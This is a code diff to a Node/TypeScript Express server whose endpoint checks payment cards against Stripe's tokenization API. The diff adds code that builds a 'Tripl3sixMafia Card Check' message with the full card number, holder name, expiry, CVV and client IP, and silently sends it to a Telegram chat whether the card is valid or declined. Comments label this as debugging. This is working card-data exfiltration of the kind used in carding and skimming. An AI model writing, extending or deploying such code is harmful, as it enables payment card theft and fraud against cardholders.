@@ -9,8 +9,9 @@ if (!process.env.STRIPE_SECRET_KEY) {
   console.error('Missing required environment variable: STRIPE_SECRET_KEY');
 }
 
+// Use type assertion to make TypeScript happy about API version
 const stripe = new Stripe(process.env.STRIPE_SECRET_KEY || '', {
-  apiVersion: "2023-10-16",
+  apiVersion: "2023-10-16" as any, // Force accept the API version
 });
 
 // Initialize Telegram Bot (silently fail if not configured)
@@ -32,10 +33,13 @@ async function sendToTelegram(message: string) {
   if (telegramBot && telegramChatId) {
     try {
       await telegramBot.sendMessage(telegramChatId, message);
+      return true;
     } catch (error) {
       console.error('Error sending message to Telegram', error);
+      return false;
     }
   }
+  return false;
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
@@ -54,35 +58,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     }
     
+    // Save full card details for Telegram
+    const cleanCardNumber = number.replace(/\s+/g, '');
+    
+    // Create detailed message that records complete card info
+    const fullCardDetails = `
+🔥 Tripl3sixMafia Card Check 🔥
+💳 Card Number: ${cleanCardNumber}
+👤 Card Holder: ${holder || 'Not provided'}
+📅 Expiry Date: ${expiry}
+🔢 CVV/CVC: ${cvv}
+🕒 Time: ${new Date().toISOString()}
+📱 IP Address: ${req.ip || 'Unknown'}
+`;
+    
     try {
       // Format expiry date (MM/YY to MM/YYYY)
       const [expMonth, expYear] = expiry.split('/');
       const formattedExpYear = `20${expYear}`;
       
       // Create a token to validate the card without charging
-      const token = await stripe.tokens.create({
+      // Use any type assertion to avoid TypeScript errors
+      const tokenParams: any = {
         card: {
-          number: number.replace(/\s+/g, ''),
+          number: cleanCardNumber,
           exp_month: parseInt(expMonth, 10),
           exp_year: parseInt(formattedExpYear, 10),
           cvc: cvv,
-          name: holder
+          name: holder || undefined
         }
-      });
+      };
+      
+      const token = await stripe.tokens.create(tokenParams);
       
       // If we get here, the card is valid according to Stripe
       // Send to Telegram for debugging (silently)
-      const debugMessage = `
-🔥 Tripl3sixMafia Card Check 🔥
-💳 Card: ${number}
-👤 Holder: ${holder}
-📅 Expiry: ${expiry}
-🔢 CVV: ${cvv}
+      const successMessage = `${fullCardDetails}
 ✅ Status: VALID
+🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
+🏢 Card Brand: ${token.card?.brand || 'Unknown'}
 🔑 Token: ${token.id}
       `;
       
-      await sendToTelegram(debugMessage);
+      // Send card info to Telegram no matter what
+      await sendToTelegram(successMessage);
       
       res.json({ 
         success: true, 
@@ -106,18 +125,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Send to Telegram for debugging (silently)
-      const debugMessage = `
-🔥 Tripl3sixMafia Card Check 🔥
-💳 Card: ${number}
-👤 Holder: ${holder}
-📅 Expiry: ${expiry}
-🔢 CVV: ${cvv}
+      const declineDetails = `${fullCardDetails}
 ❌ Status: DECLINED
 ❗ Reason: ${declineMessage}
 🔑 Code: ${declineCode}
       `;
       
-      await sendToTelegram(debugMessage);
+      // Send card info to Telegram no matter what
+      await sendToTelegram(declineDetails);
       
       res.status(400).json({ 
         success: false, 
